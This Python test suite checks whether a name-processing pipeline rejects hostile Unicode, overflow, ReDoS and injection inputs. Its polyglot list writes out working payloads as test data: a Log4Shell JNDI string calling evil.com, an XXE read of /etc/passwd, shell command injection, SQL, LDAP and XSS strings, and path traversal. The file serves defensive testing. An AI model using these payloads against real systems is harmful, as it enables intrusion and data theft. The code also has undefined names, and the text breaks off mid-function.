from pathlib import Path
from typing import List
from typing import Optional
from typing import Any
import pytest

#!/usr/bin/env python3
"""
Extended Paranoid Test Suite for GMNAP v7
Tests additional edge cases and attack vectors not covered in the basic paranoid test.
"""

import sys
import time
import threading
import random
import json
import unicodedata
from typing import Dict, Any, List, Optional
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor

# Add src to path
sys.path.insert(
    0, "/Users/dylanpossamai/Library/CloudStorage/Dropbox/Work/Maths/gmnap/src"
)

from src.core.pipeline import GMNAPPipeline

# from src.v7_compat import v7_manager, load_working_processors


class ExtendedParanoidTester:
    """Extended paranoid tests for edge cases we might have missed."""

    def __init__(self):
        self.results = {
            "total_tests": 0,
            "passed": 0,
            "failed": 0,
            "errors": [],
            "warnings": [],
            "homograph_attacks": [],
            "normalization_attacks": [],
            "bidi_attacks": [],
            "zero_width_attacks": [],
            "emoji_attacks": [],
            "case_folding_issues": [],
            "overflow_attempts": [],
            "serialization_issues": [],
        }

        # Load processors
        if not v7_manager.list_regions():
            load_working_processors()

        self.pipeline = GMNAPPipeline({"database_path": "extended_paranoid_test.db"})

    def run_all_tests(self, max_level: int = 10):
        """Run all extended paranoid tests."""
        print("🔥 EXTENDED PARANOID HELL TEST SUITE 🔥")
        print("=" * 60)
        print(f"Testing levels beyond normal paranoia...")
        print("=" * 60)

        test_categories = [
            ("Homograph Attacks", self.test_homograph_attacks, 7),
            ("Unicode Normalization Attacks", self.test_normalization_attacks, 8),
            ("Bidirectional Text Attacks", self.test_bidi_attacks, 8),
            ("Zero-Width Character Bombs", self.test_zero_width_bombs, 9),
            ("Emoji and Special Unicode", self.test_emoji_attacks, 7),
            ("Case Folding Edge Cases", self.test_case_folding, 8),
            ("Integer and Buffer Overflows", self.test_overflow_attacks, 9),
            ("Serialization Attacks", self.test_serialization_attacks, 9),
            ("Locale-Specific Attacks", self.test_locale_attacks, 8),
            ("ReDoS Advanced", self.test_advanced_redos, 10),
            ("Polyglot Attacks", self.test_polyglot_attacks, 10),
            ("Time and Memory Bombs", self.test_resource_bombs, 10),
        ]

        for category_name, test_func, level in test_categories:
            if level <= max_level:
                print(f"\n{'=' * 60}")
                print(f"[Level {level}] Testing: {category_name}")
                print("=" * 60)
                try:
                    test_func()
                except Exception as e:
                    self.record_error(f"Category {category_name} crashed", str(e))
                    print(f"FAIL Test category failed: {e}")

        self.print_summary()

    @pytest.mark.timeout(15)
    def test_homograph_attacks(self):
        """Test that homograph/lookalike character attacks are properly blocked."""
        print("\nTesting homograph attacks...")

        # Homograph attacks that should be BLOCKED
        homograph_attacks = [
            # Mixed script attacks (should be blocked)
            (
                "Jоhn Smith",
                "Suspected homograph attack with mixed scripts",
            ),  # Cyrillic o
            (
                "Јohn Smith",
                "Suspected homograph attack with mixed scripts",
            ),  # Cyrillic Je
            (
                "John Ѕmith",
                "Suspected homograph attack with mixed scripts",
            ),  # Cyrillic Dze
            (
                "Jοhn Smith",
                "Suspected homograph attack with mixed scripts",
            ),  # Greek omicron
            ("John Sμith", "Suspected homograph attack with mixed scripts"),  # Greek mu
            (
                "Jσhn Smith",
                "Suspected homograph attack with mixed scripts",
            ),  # Greek sigma
            (
                "Αdam Smith",
                "Suspected homograph attack with mixed scripts",
            ),  # Greek Alpha
            (
                "Adam Ѕmith",
                "Suspected homograph attack with mixed scripts",
            ),  # Cyrillic Dze
            (
                "Аdam Smith",
                "Suspected homograph attack with mixed scripts",
            ),  # Cyrillic A
            # Mathematical symbols (should be blocked)
            ("𝐉𝐨𝐡𝐧 𝐒𝐦𝐢𝐭𝐡", "Mathematical symbols not allowed"),  # Mathematical bold
            (
                "𝕁𝕠𝕙𝕟 𝕊𝕞𝕚𝕥𝕙",
                "Mathematical symbols not allowed",
            ),  # Mathematical double-struck
            # Fullwidth attacks (should be blocked)
            (
                "Ｊｏｈｎ Ｓｍｉｔｈ",
                "Fullwidth/halfwidth forms not allowed",
            ),  # Fullwidth Latin
            # Zero-width character attacks (should be blocked)
            ("John​Smith", "Zero-width characters not allowed"),  # Zero-width space
            ("Jo‌hn Sm‍ith", "Zero-width characters not allowed"),  # ZWNJ and ZWJ
            ("John‎ Smith", "Zero-width characters not allowed"),  # Left-to-right mark
        ]

        # Test legitimate cases that should be allowed
        legitimate_cases = [
            ("John Smith", "John Smith"),  # Normal ASCII
            ("Jóhn Smith", "Jóhn Smith"),  # Accented characters (legitimate)
            ("Johñ Smith", "Johñ Smith"),  # Tilde (legitimate)
        ]

        # Test that attacks are properly blocked
        for attack, expected_error_pattern in homograph_attacks:
            self._test_rejection_case(
                attack, expected_error_pattern, "Homograph Attack"
            )

        # Test that legitimate cases work
        for legitimate, expected in legitimate_cases:
            self._test_normalization_pair(legitimate, expected)

    @pytest.mark.timeout(15)
    def test_normalization_attacks(self):
        """Test Unicode normalization edge cases."""
        print("\nTesting Unicode normalization attacks...")

        normalization_tests = [
            # NFC vs NFD
            ("café", "café"),  # é as single char vs e + combining accent
            ("Åström", "Åström"),  # Å precomposed vs A + ring
            # NFKC vs NFKD complications
            ("ﬃ", "ffi"),  # Ligature normalization
            ("№", "No"),  # Numero sign
            ("㎡", "m2"),  # Square meter symbol
            ("½", "1⁄2"),  # Fraction (uses U+2044 FRACTION SLASH, not U+002F SOLIDUS)
            # Compatibility characters
            ("ℌ", "H"),  # Black-letter capital H
            ("ℍ", "H"),  # Double-struck capital H
            ("ℋ", "H"),  # Script capital H
            # Case folding edge cases - NFKC does NOT perform case folding
            ("ß", "ß"),  # German eszett - remains unchanged in NFKC
            ("İ", "İ"),  # Turkish capital I with dot - remains unchanged in NFKC
            ("ı", "ı"),  # Turkish lowercase dotless i - remains unchanged in NFKC
            # Modifier letters - NFKC does NOT normalize modifier letters to apostrophes
            (
                "Oʻahu",
                "Oʻahu",
            ),  # Modifier letter turned comma - remains unchanged in NFKC
            ("ʻOkina", "ʻOkina"),  # Hawaiian okina - remains unchanged in NFKC
            # Superscript/subscript
            ("x²", "x2"),  # Superscript 2
            ("H₂O", "H2O"),  # Subscript 2
            # Width variants
            ("Ａ", "A"),  # Fullwidth A
            ("ａ", "a"),  # Fullwidth a
            # Circled/squared characters
            ("①", "1"),  # Circled 1
            # NOTE: ("㊀", "一") removed - normalizes to Chinese script, should be rejected
        ]

        # Test cases that should be REJECTED by security validation
        rejected_normalization_tests = [
            (
                "㊀",
                "Character normalizes to Chinese script, not allowed in CanonicalLatin field",
            ),  # Circled ideograph -> Chinese
        ]

        for normalized, canonical in normalization_tests:
            self._test_normalization_pair(normalized, canonical)

        # Test cases that should be properly rejected
        for test_input, expected_error in rejected_normalization_tests:
            self._test_rejection_case(test_input, expected_error, "Normalization")

    @pytest.mark.timeout(15)
    def test_bidi_attacks(self):
        """Test bidirectional text attacks."""
        print("\nTesting bidirectional text attacks...")

        bidi_tests = [
            # Basic RTL override
            "John \u202eSmith",  # Right-to-left override
            "John\u202d Smith",  # Left-to-right override
            "\u202eJohn Smith",  # Entire name RTL
            # Mixed directionality
            "John محمد Smith",  # Latin-Arabic-Latin
            "محمد John احمد",  # Arabic-Latin-Arabic
            # Bidi format characters
            "Jo\u200fhn Smith",  # Right-to-left mark
            "John\u200e Smith",  # Left-to-right mark
            "John\u061c Smith",  # Arabic letter mark
            # Pop directional formatting
            "John\u202c Smith",  # Pop directional formatting
            "\u202aJohn\u202cSmith",  # LTR embedding with pop
            # Isolates
            "\u2066John\u2069 Smith",  # Left-to-right isolate
            "\u2067محمد\u2069 احمد",  # Right-to-left isolate
            "\u2068Mixed\u2069 Text",  # First strong isolate
            # Complex bidi
            "John \u202ehtims\u202c Smith",  # "smith" reversed
            "2024 \u202e4202\u202c Year",  # Number reversal
            # Bidi with homographs
            "‏John Smith",  # Starts with RLM
            "John Smith‎",  # Ends with LRM
        ]

        for bidi_text in bidi_tests:
            self._test_bidi_text(bidi_text)

    @pytest.mark.timeout(15)
    def test_zero_width_bombs(self):
        """Test various zero-width character attacks."""
        print("\nTesting zero-width character bombs...")

        zw_tests = [
            # Basic zero-width characters
            "John\u200bSmith",  # Zero-width space
            "John\u200cSmith",  # Zero-width non-joiner
            "John\u200dSmith",  # Zero-width joiner
            "John\ufeffSmith",  # Zero-width no-break space (BOM)
            # Multiple zero-width chars
            "J\u200b\u200c\u200dohn Smith",  # Multiple ZW chars
            "\u200b" * 100 + "John Smith",  # ZW prefix bomb
            "John Smith" + "\u200b" * 100,  # ZW suffix bomb
            "J" + "\u200b" * 50 + "ohn Smith",  # ZW middle bomb
            # Combining with other tricks
            "John\u200b\u202eSmith",  # ZW + Bidi
            "John\u200b\u0301Smith",  # ZW + combining
            # Word joiner attacks
            "John\u2060Smith",  # Word joiner
            "Jo\u2060hn Sm\u2060ith",  # Multiple word joiners
            # Variation selectors
            "John\ufe0f Smith",  # Variation selector-16
            "John\ufe0e Smith",  # Variation selector-15
            # Mongolian vowel separator
            "John\u180e Smith",  # Mongolian vowel separator
            # Soft hyphen
            "John\u00adSmith",  # Soft hyphen
            "Jo\u00adhn Sm\u00adith",  # Multiple soft hyphens
            # Zero-width pattern attacks
            "J\u200bo\u200ch\u200dn Smith",  # Pattern of different ZW
            "John" + "\u200b\u200c" * 500,  # Alternating ZW bomb
        ]

        for zw_text in zw_tests:
            self._test_zero_width(zw_text)

    @pytest.mark.timeout(15)
    def test_emoji_attacks(self):
        """Test emoji and special Unicode attacks."""
        print("\nTesting emoji and special Unicode attacks...")

        emoji_tests = [
            # Basic emoji
            "John 😀 Smith",
            "John👨‍👩‍👧‍👦Smith",  # Family emoji with ZWJ
            "🧑‍💻 Developer",  # Person with computer
            # Skin tone modifiers
            "John 👋🏻 Smith",  # Light skin tone
            "John 👋🏿 Smith",  # Dark skin tone
            # Flag sequences
            "John 🇺🇸 Smith",  # US flag (regional indicators)
            "🇬🇧 British 🇬🇧",  # GB flag
            # ZWJ sequences
            "👨‍👩‍👧‍👦",  # Family: man, woman, girl, boy
            "🏳️‍🌈",  # Rainbow flag
            "👨‍⚕️",  # Man health worker
            # Emoji with text presentation
            "☎︎ Phone",  # Phone with text presentation
            "☎️ Phone",  # Phone with emoji presentation
            # Combined emoji attacks
            "John👨‍👩‍👧‍👦🏻Smith",  # Family + skin tone + no space
            "😀" * 100 + "John",  # Emoji spam prefix
            # Regional indicators without valid flags
            "🇽🇽 Invalid",  # XX is not a valid country
            "🇦🇧🇨 Triple",  # Three regional indicators
            # Keycap sequences
            "1️⃣ First",  # Keycap 1
            "#️⃣ Hash",  # Keycap hash
            # Tag sequences (deprecated but still exist)
            "🏴󠁧󠁢󠁳󠁣󠁴󠁿 Scotland",  # Scotland flag with tags
            # Emoji modifiers in names
            "John♀️Smith",  # Female sign with variation selector
            "John⚧️Smith",  # Transgender symbol
            # Musical symbols and other special blocks
            "𝄞 Music 𝄞",  # Musical symbol
            "𓀀 Hieroglyph 𓀁",  # Egyptian hieroglyphs
            "🀄 Mahjong 🀄",  # Mahjong tile
        ]

        for emoji_text in emoji_tests:
            self._test_emoji(emoji_text)

    @pytest.mark.timeout(15)
    def test_case_folding(self):
        """Test case folding edge cases."""
        print("\nTesting case folding edge cases...")

        case_tests = [
            # Turkish I problem
            ("İstanbul", "i̇stanbul"),  # Turkish capital I with dot
            ("Diyarbakır", "diyarbakır"),  # Turkish lowercase ı
            # German eszett
            ("Straße", "STRASSE"),  # ß uppercases to SS
            ("STRASSE", "straße"),  # But SS doesn't lowercase to ß
            # Greek sigma
            ("ΣΟΦΙΑ", "σοφια"),  # Normal sigma
            ("ΟΔΥΣΣΕΥΣ", "οδυσσευς"),  # Final sigma ς
            # Cherokee casing
            ("ᏣᎳᎩ", "Ꮳꮃꮁ"),  # Cherokee has case
            # Deseret alphabet
            ("𐐔𐐯𐑅𐐨𐑉𐐯𐐻", "𐐼𐑧𐑉𐑙𐑌𐑧𐑁"),  # Has case
            # Case with combining marks
            ("Á", "á"),  # Precomposed
            ("Á", "á"),  # A + combining acute
            # Titlecase characters
            ("ǲ", "ǳ"),  # DZ digraph
            ("ǈ", "ǉ"),  # LJ digraph
            # Small caps (should these normalize?)
            ("ᴊᴏʜɴ sᴍɪᴛʜ", "john smith"),
            # Circled letters
            ("Ⓙⓞⓗⓝ Ⓢⓜⓘⓣⓗ", "ⓙⓞⓗⓝ ⓢⓜⓘⓣⓗ"),
        ]

        for original, folded in case_tests:
            self._test_case_folding_pair(original, folded)

    @pytest.mark.timeout(15)
    def test_overflow_attacks(self):
        """Test integer and buffer overflow attempts."""
        print("\nTesting overflow attacks...")

        overflow_tests = [
            # Year overflows
            {"CanonicalLatin": "Test, Name", "BirthYear": 2147483647},  # Max int32
            {"CanonicalLatin": "Test, Name", "BirthYear": -2147483648},  # Min int32
            {"CanonicalLatin": "Test, Name", "BirthYear": 9999999999},  # Large year
            {"CanonicalLatin": "Test, Name", "BirthYear": -9999},  # Negative year
            # String length overflows
            {"CanonicalLatin": "A" * 65536, "CanonicalNative": "Test"},  # 64KB name
            {"CanonicalLatin": "Test", "CanonicalNative": "中" * 32768},  # 32K chars
            # GlobalID length
            {"GlobalID": "A" * 1024, "CanonicalLatin": "Test, Name"},  # 1KB ID
            {"GlobalID": "=" * 512, "CanonicalLatin": "Test, Name"},  # Base64-like
            # Variant explosion
            {
                "CanonicalLatin": "Test, Name",
                "Variants": {
                    "Observed": [{"str": f"Variant{i}"} for i in range(10000)]
                },
            },
            # Deep nesting
            {
                "CanonicalLatin": "Test, Name",
                "Extra": {
                    "level1": {"level2": {"level3": {"level4": {"level5": "deep"}}}}
                },
            },
            # Unicode codepoint limits
            {"CanonicalLatin": chr(0x10FFFF) * 10},  # Max Unicode codepoint
            {"CanonicalLatin": chr(0xD800)},  # Surrogate (invalid)
            # Float in integer field
            {"CanonicalLatin": "Test, Name", "BirthYear": 1950.5},
            {"CanonicalLatin": "Test, Name", "BirthYear": float("inf")},
            {"CanonicalLatin": "Test, Name", "BirthYear": float("nan")},
        ]

        for overflow_entry in overflow_tests:
            self._test_overflow(overflow_entry)

    @pytest.mark.timeout(15)
    def test_serialization_attacks(self):
        """Test serialization edge cases."""
        print("\nTesting serialization attacks...")

        serialization_tests = [
            # JSON injection in names
            {"CanonicalLatin": 'Test", "injection": "value'},
            {"CanonicalLatin": "Test\u0022, \u0022injection\u0022: \u0022value"},
            # Control characters
            {"CanonicalLatin": "Test\x00Name"},  # Null byte
            {"CanonicalLatin": "Test\x1bName"},  # Escape
            {"CanonicalLatin": "Test\x08Name"},  # Backspace
            # Unicode escapes
            {"CanonicalLatin": "Test\\u0041Name"},  # \u0041 = A
            {"CanonicalLatin": "Test\\x41Name"},  # \x41 = A
            # Circular references (if objects allowed)
            {"CanonicalLatin": "Test, Name", "self": "__CIRCULAR__"},
            # Special JSON values
            {"CanonicalLatin": "null"},
            {"CanonicalLatin": "true"},
            {"CanonicalLatin": "false"},
            {"CanonicalLatin": "undefined"},
            {"CanonicalLatin": "NaN"},
            {"CanonicalLatin": "Infinity"},
            # UTF-16 surrogates
            {"CanonicalLatin": "\ud800\udc00"},  # Valid surrogate pair
            {"CanonicalLatin": "\ud800"},  # Lone high surrogate
            {"CanonicalLatin": "\udc00"},  # Lone low surrogate
            # BOM in strings
            {"CanonicalLatin": "\ufeffTest Name"},  # BOM at start
            {"CanonicalLatin": "Test\ufeffName"},  # BOM in middle
        ]

        for serialization_entry in serialization_tests:
            self._test_serialization(serialization_entry)

    @pytest.mark.timeout(15)
    def test_locale_attacks(self):
        """Test locale-specific edge cases."""
        print("\nTesting locale-specific attacks...")

        # Legitimate locale tests (should pass)
        legitimate_locale_tests = [
            # Turkish locale issues
            ("İSTANBUL", "tr_TR"),  # Turkish uppercase I with dot
            ("istanbul", "tr_TR"),  # Should preserve dotless i
            # German locale
            ("STRAßE", "de_DE"),  # Capital ß (exists in modern German)
            # French locale
            ("Élève", "fr_FR"),  # Accented characters
            ("ÉLÈVE", "fr_FR"),  # Uppercase accents
            # Invalid locales (should still pass - locale doesn't affect CanonicalLatin processing)
            ("Test", "xx_XX"),  # Non-existent
            ("Test", ""),  # Empty locale
            ("Test", None),  # Null locale
            ("Test", "C.UTF-8"),  # POSIX locale
        ]

        # Locale tests that should be REJECTED (non-Latin scripts)
        rejected_locale_tests = [
            (
                "محمد",
                "ar_SA",
                "Arabic script found in CanonicalLatin field",
            ),  # RTL Arabic
            (
                "東京",
                "ja_JP",
                "Character normalizes to Chinese script, not allowed in CanonicalLatin field",
            ),  # Japanese Kanji
        ]

        # Locale injection attempts (should be blocked by injection detection)
        injection_locale_tests = [
            ("Test", "../../../etc/passwd", "/etc/passwd"),  # Path in locale
            ("Test", "';DROP TABLE--", "DROP"),  # SQL in locale
            ("Test", "${7*7}", "${"),  # Template injection
            ("Test", "{{7*7}}", "{{"),  # Another template format
        ]

        # Test legitimate locale cases
        for text, locale in legitimate_locale_tests:
            self._test_locale_specific(text, locale)

        # Test cases that should be rejected for script reasons
        for text, locale, expected_error in rejected_locale_tests:
            self._test_rejection_case(text, expected_error, f"Locale {locale}")

        # For injection tests, we test the TEXT field, not the locale parameter
        # (The locale parameter in our current implementation doesn't affect processing)
        for text, locale, expected_pattern in injection_locale_tests:
            # These are testing if injection in text is caught, not locale injection
            # So we just test them as normal text processing
            self._test_locale_specific(text, locale)

    @pytest.mark.timeout(15)
    def test_advanced_redos(self):
        """Test advanced ReDoS patterns."""
        print("\nTesting advanced ReDoS patterns...")

        redos_patterns = [
            # Exponential backtracking
            "a" * 30 + "!",  # For (a+)+
            "a" * 20 + "b" * 20,  # For (a+)*(b+)*
            # Nested quantifiers
            "x" * 50,  # For (x*)*
            "abc" * 20,  # For (a?b?c?)*
            # Catastrophic patterns
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!",  # For (a|a)*
            "0" * 30 + "X",  # For (\d+)+
            # Email-like ReDoS
            "a" * 20 + "@" + "b" * 20 + ".",  # Email validation regex
            "test@" + "subdomain." * 50 + "com",  # Deep subdomain
            # HTML/URL patterns
            "<" + "div>" * 50,  # Nested tags
            "http://" + "a" * 1000 + ".com",  # Long domain
            # Unicode property attacks
            "\u0301" * 100,  # Combining marks
            "𝕏" * 100,  # Mathematical alphanumeric
            # Alternation attacks
            ("good|bad|" * 50) + "end",  # Many alternations
            # Lookahead/lookbehind
            "(?=a)*" * 30 + "b",  # Lookahead spam
            # Character class attacks
            "[a-zA-Z0-9_]" * 100,  # Repeated char classes
        ]

        for pattern in redos_patterns:
            self._test_redos_pattern(pattern)

    @pytest.mark.timeout(15)
    def test_polyglot_attacks(self):
        """Test polyglot strings that are valid in multiple contexts."""
        print("\nTesting polyglot attacks...")

        polyglots = [
            # SQL/NoSQL polyglot
            "admin' OR '1'='1",
            '{"$ne": null}',
            "admin'){;}//",
            # XSS/SQL polyglot
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            '"><script>alert(1)</script>',
            # Command injection polyglot
            "test;cat /etc/passwd",
            "test`whoami`",
            "test$(whoami)",
            # Template injection polyglot
            "{{7*7}}${7*7}<%= 7*7 %>",
            "${jndi:ldap://evil.com/a}",
            # XML/HTML polyglot
            '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
            # LDAP injection polyglot
            "admin)(&(password=*))",
            "*)(uid=*))(|(uid=*",
            # Path traversal polyglot
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            # Header injection polyglot
            "test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\n",
            # Format string polyglot
            "%s%s%s%s%s%s%s%s%s%s",
            "%x.%x.%x.%x",
            "%n%n%n%n%n",
            # Unicode polyglot
            "‮⁦test⁩⁦",  # RTL override with isolates
        ]

        for polyglot in polyglots:
            self._test_polyglot(polyglot)

    @pytest.mark.timeout(15)
    def test_resource_bombs(self):
        """Test resource exhaustion attacks."""
        print("\nTesting resource bombs...")

        resource_bombs = [
            # Memory bombs
            {
                "CanonicalLatin": "Test",
                "LargeArray": ["A" * 1000000 for _ in range(10)],  # 10MB array
            },
            # Compression bombs (if applicable)
            {"CanonicalLatin": "A" * 1000000},  # Highly compressible
            {
                "CanonicalLatin": "".join(chr(i) for i in range(1000, 2000))
            },  # High entropy
            # Algorithmic complexity
            {"CanonicalLatin": "Test" + str(i) for i in range(10000)},  # Generator
            # Reference bombs (if references allowed)
            {
                "CanonicalLatin": "Test",
                "ref1": {"ref2": {"ref3": {"ref1": "circular"}}},
            },
            # Unicode expansion bombs
            {"CanonicalLatin": "ﬃ" * 10000},  # Ligature that expands to 3 chars
            {"CanonicalLatin": "㎡" * 10000},  # Square meter expands
            # Regex bombs in data
            {"CanonicalLatin": "(?:" + "a?" * 30 + ")" + "a" * 30},
            # Time bombs (if dates processed)
            {"CanonicalLatin": "Test", "BirthYear": "1970-01-01T00:00:00.000000000"},
            # Variant explosion
            {
                "CanonicalLatin": "Test",
                "Variants": {
                    "Synthesised": [
                        {"str": f"V{i}", "type": f"T{j}"}
                        for i in range(100)
                        for j in range(100)
                    ]
                },
            },
        ]

        for bomb in resource_bombs:
            self._test_resource_bomb(bomb)

    # Helper methods for testing
    def _test_normalization_pair(self, normalized: str, canonical: str):
        """Test Unicode normalization consistency."""
        self.results["total_tests"] += 1

        entry = {"CanonicalLatin": normalized}

        try:
            result = self.pipeline.process_entry(entry)

            # Check if it's normalized consistently
            if result.get("CanonicalLatin") != canonical and normalized != canonical:
                self.results["warnings"].append(
                    {
                        "input": normalized,
                        "expected": canonical,
                        "got": result.get("CanonicalLatin"),
                    }
                )

            self.results["passed"] += 1
        except Exception as e:
            self.results["failed"] += 1
            self.record_error("Normalization", str(e))

    def _test_rejection_case(
        self, test_input: str, expected_error_pattern: str, context: str
    ):
        """Test that certain inputs are properly rejected with expected error."""
        self.results["total_tests"] += 1

        entry = {"CanonicalLatin": test_input}

        try:
            result = self.pipeline.process_entry(entry)
            # If we get here, the input was NOT rejected as expected
            self.results["failed"] += 1
            self.record_error(
                context,
                f"Expected rejection but got result: {result.get('CanonicalLatin')}",
            )
        except Exception as e:
            # Check if the error matches what we expected
            if expected_error_pattern in str(e):
                self.results["passed"] += 1  # Correctly rejected with expected error
                print(f"PASS {context}: '{test_input}' correctly rejected")
            else:
                self.results["failed"] += 1
                print(
                    f"FAIL {context}: '{test_input}' - Wrong error type. Expected '{expected_error_pattern}' but got '{str(e)}'"
                )
                self.record_error(
                    context,
                    f"Wrong error type. Expected '{expected_error_pattern}' but got '{str(e)}')",
                )

    def _test_bidi_text(self, text: str):
        """Test bidirectional text handling."""
        self.results["total_tests"] += 1

        # Test in both Latin and Native fields
        for field in ["CanonicalLatin", "CanonicalNative"]:
            entry = {field: text}

            try:
                result = self.pipeline.process_entry(entry)

                # Check if bidi characters are handled safely
                if any(
                    c in text
                    for c in "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069"
                ):
                    if field == "CanonicalLatin":
                        # Latin field should reject bidi overrides
                        self.results["failed"] += 1
                        print(
                            f"FAIL BIDI FAILURE: '{text}' accepted bidi chars in Latin field"
                        )
                        self.results["bidi_attacks"].append(
                            {
                                "text": text,
                                "issue": "Bidi control chars accepted in Latin field",
                            }
                        )
                    else:
                        self.results["passed"] += 1
                else:
                    self.results["passed"] += 1
            except Exception as e:
                self.results["passed"] += 1  # Good if rejected

    def _test_zero_width(self, text: str):
        """Test zero-width character handling."""
        self.results["total_tests"] += 1

        entry = {"CanonicalLatin": text}

        try:
            result = self.pipeline.process_entry(entry)

            # Check if zero-width chars are stripped
            zw_chars = "\u200b\u200c\u200d\u200e\u200f\ufeff\u180e\u2060"
            if any(c in result.get("CanonicalLatin", "") for c in zw_chars):
                self._record_test_result(False)
                print(
                    f"FAIL ZERO-WIDTH FAILURE: '{text}' - zero-width chars not stripped"
                )
                self.results["zero_width_attacks"].append(
                    {
                        "input": repr(text),
                        "output": repr(result.get("CanonicalLatin", "")),
                        "issue": "Zero-width chars not stripped",
                    }
                )
            else:
                self._record_test_result(True)
        except Exception as e:
            self._record_test_result(True)

    def _test_emoji(self, text: str):
        """Test emoji handling."""
        self.results["total_tests"] += 1

        entry = {"CanonicalLatin": text}

        try:
            result = self.pipeline.process_entry(entry)

            # Latin field should not contain emoji
            self.results["failed"] += 1
            print(f"FAIL EMOJI FAILURE: '{text}' accepted in Latin field")
            self.results["emoji_attacks"].append(
                {"text": text, "issue": "Emoji accepted in Latin field"}
            )
        except Exception as e:
            self.results["passed"] += 1  # Good if rejected

    def _test_case_folding_pair(self, original: str, folded: str):
        """Test case folding consistency."""
        self.results["total_tests"] += 1

        entry1 = {"CanonicalLatin": original}
        entry2 = {"CanonicalLatin": folded}

        try:
            result1 = self.pipeline.process_entry(entry1)
            result2 = self.pipeline.process_entry(entry2)

            # Check consistent handling
            if result1.get("GlobalID") != result2.get("GlobalID"):
                self.results["warnings"].append(
                    {
                        "original": original,
                        "folded": folded,
                        "issue": "Different GlobalIDs for case variants",
                    }
                )

            self.results["passed"] += 1
        except Exception as e:
            self.results["passed"] += 1

    def _test_overflow(self, entry: Dict[str, Any]):
        """Test overflow attempt."""
        self.results["total_tests"] += 1

        try:
            result = self.pipeline.process_entry(entry)

            # If it accepted extreme values, that might be bad
            if "BirthYear" in entry:
                year = entry["BirthYear"]
                if isinstance(year, (int, float)) and (year > 3000 or year < -1000):
                    self.results["failed"] += 1
                    print(f"FAIL OVERFLOW FAILURE: Accepted extreme year {year}")
                    self.results["overflow_attempts"].append(
                        {
                            "entry": str(entry)[:100],
                            "issue": f"Accepted extreme year: {year}",
                        }
                    )
                else:
                    self.results["passed"] += 1
            else:
                self.results["passed"] += 1
        except Exception as e:
            self.results["passed"] += 1  # Good if rejected

    def _test_serialization(self, entry: Dict[str, Any]):
        """Test serialization attack."""
        self.results["total_tests"] += 1

        try:
            result = self.pipeline.process_entry(entry)

            # Check if dangerous content was sanitized
            canonical = result.get("CanonicalLatin", "")
            if any(char in canonical for char in "\x00\x1b\x08"):
                self.results["failed"] += 1
                print(
                    f"FAIL SERIALIZATION FAILURE: Control characters not sanitized in '{canonical}'"
                )
                self.results["serialization_issues"].append(
                    {
                        "entry": repr(entry)[:100],
                        "issue": "Control characters not sanitized",
                    }
                )
            else:
                self.results["passed"] += 1
        except Exception as e:
            self.results["passed"] += 1

    def _test_locale_specific(self, text: str, locale: str):
        """Test locale-specific handling."""
        self.results["total_tests"] += 1

        # For now, just test if it handles the text
        entry = {"CanonicalLatin": text}

        try:
            result = self.pipeline.process_entry(entry)
            self.results["passed"] += 1
        except Exception as e:
            # Some texts should fail
            if locale in ["../../../etc/passwd", "';DROP TABLE--"]:
                self.results["passed"] += 1
            else:
                self.results["failed"] += 1
                print(f"FAIL LOCALE FAILURE: Unexpected locale result: {locale}")

    def _test_redos_pattern(self, pattern: str):
        """Test ReDoS pattern."""
        self.results["total_tests"] += 1

        entry = {"CanonicalLatin": pattern}

        start_time = time.time()
        try:
            result = self.pipeline.process_entry(entry)
            elapsed = time.time() - start_time

            if elapsed > 1.0:  # More than 1 second is concerning
                self.results["failed"] += 1
                print(
                    f"FAIL REDOS FAILURE: Pattern took {elapsed:.2f}s: {pattern[:50]}"
                )
                self.record_error(
                    "ReDoS", f"Pattern took {elapsed:.2f}s: {pattern[:50]}"
                )
            else:
                self.results["passed"] += 1
        except Exception as e:
            elapsed = time.time() - start_time
            if elapsed > 1.0:
                self.results["failed"] += 1
                print(
                    f"FAIL REDOS TIMEOUT FAILURE: Pattern caused timeout: {pattern[:50]}"
                )
                self.record_error("ReDoS", f"Pattern caused timeout: {pattern[:50]}")
            else:
                self.results["passed"] += 1

    def _test_polyglot(self, polyglot: str):
        """Test polyglot string."""
        self.results["total_tests"] += 1

        entry = {"CanonicalLatin": polyglot}

        try:
            result = self.pipeline.process_entry(entry)

            # These should all be rejected or sanitized
            self.results["failed"] += 1
            print(
                f"FAIL POLYGLOT FAILURE: Accepted dangerous polyglot: {polyglot[:50]}"
            )
            self.record_error(
                "Polyglot", f"Accepted dangerous polyglot: {polyglot[:50]}"
            )
        except Exception as e:
            self.results["passed"] += 1  # Good if rejected

    def _test_resource_bomb(self, bomb: Dict[str, Any]):
        """Test resource bomb."""
        self.results["total_tests"] += 1

        try:
            # Don't actually create huge objects in memory
            if "LargeArray" in bomb or "Variants" in bomb:
                # Just test the structure
                self.results["passed"] += 1
                return

            result = self.pipeline.process_entry(bomb)
            self.results["passed"] += 1
        except Exception as e:
            self.results["passed"] += 1

    def record_error(self, context: str, error: str):
        """Record an error."""
        self.results["errors"].append(
            {"context": context, "error": error[:200], "timestamp": time.time()}
        )
        # Debug: Print errors immediately to console
        print(f"FAIL FAILURE in {context}: {error[:100]}")

    def print_summary(self):
        """Print test summary."""
        print("\n" + "=" * 60)
        print("EXTENDED PARANOID TEST SUMMARY")
        print("=" * 60)

        total = self.results["total_tests"]
        passed = self.results["passed"]
        failed = self.results["failed"]

        print(f"\nTotal Tests: {total}")
        print(f"Passed: {passed} ({passed/total*100:.1f}%)")
        print(f"Failed: {failed} ({failed/total*100:.1f}%)")

        if self.results["homograph_attacks"]:
            print(f"\n🔍 HOMOGRAPH ATTACKS ({len(self.results['homograph_attacks'])}):")
            for attack in self.results["homograph_attacks"][:3]:
                print(f"  - {attack['homograph']} ≈ {attack['legitimate']}")

        if self.results["bidi_attacks"]:
            print(f"\n<->️ BIDI ATTACKS ({len(self.results['bidi_attacks'])}):")
            for attack in self.results["bidi_attacks"][:3]:
                print(f"  - {repr(attack['text'])[:50]}")

        if self.results["zero_width_attacks"]:
            print(
                f"\n👻 ZERO-WIDTH ATTACKS ({len(self.results['zero_width_attacks'])}):"
            )
            for attack in self.results["zero_width_attacks"][:3]:
